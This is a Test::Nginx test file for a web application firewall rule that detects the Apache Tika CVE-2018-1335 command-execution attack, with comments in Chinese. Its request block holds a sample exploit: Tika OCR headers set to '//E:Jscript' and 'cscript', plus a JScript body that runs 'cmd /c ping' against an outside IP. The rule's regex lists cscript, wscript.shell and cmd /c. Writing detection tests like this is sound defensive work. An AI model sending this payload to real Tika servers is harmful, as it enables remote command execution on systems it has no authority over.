use Test::Nginx::Socket 'no_plan';

# 设置测试环境
no_root_location();
no_shuffle();

run_tests();

# Apache Tika CVE-2018-1335 命令执行漏洞

__DATA__
=== TEST 1: 测试1
--- http_config
    error_log logs/error.log debug;
--- config
        # 精确匹配 /echo 并返回固定响应
        location = /echo {
            return 200 "echo";
        }

        # 处理其他所有请求
        location / {
            error_log logs/error.log debug;

            # 检查是否为内部代理请求
            if ($http_x_internal_proxy = "true") {
                return 200 "echo";
            }

            # 应用自定义规则
            rule 'rule 2005 http.uri contains "/meta" and http.method = PUT and http.raw_req_body matches "(?i)X-Tika-OCR(Language|TesseractPath):\\s*[\"]{0,2}(//E:|cscript|wscript\\.shell|cmd\\s*/c)";';

            # 设置自定义请求头标识内部代理请求
            proxy_set_header X-Internal-Proxy true;

            # 代理请求到 /echo
            proxy_pass http://127.0.0.1:$TEST_NGINX_SERVER_PORT/echo;
        }
--- request
PUT /meta?X-BasTag=a766440e93f7
var oShell = WScript.CreateObject("WScript.Shell");
            var oExec = oShell.Exec('cmd /c ping 102.104.77.189:8080/d02a8417-284e-4b26-9eb6-0c8145276098');
--- more_headers
Content-type: image/jp2
X-Tika-OCRLanguage: //E:Jscript
X-Tika-OCRTesseractPath: "cscript"
Expect: 100-continue

--- error_log
Matched Rule ID: 2005

--- no_error_log
[error]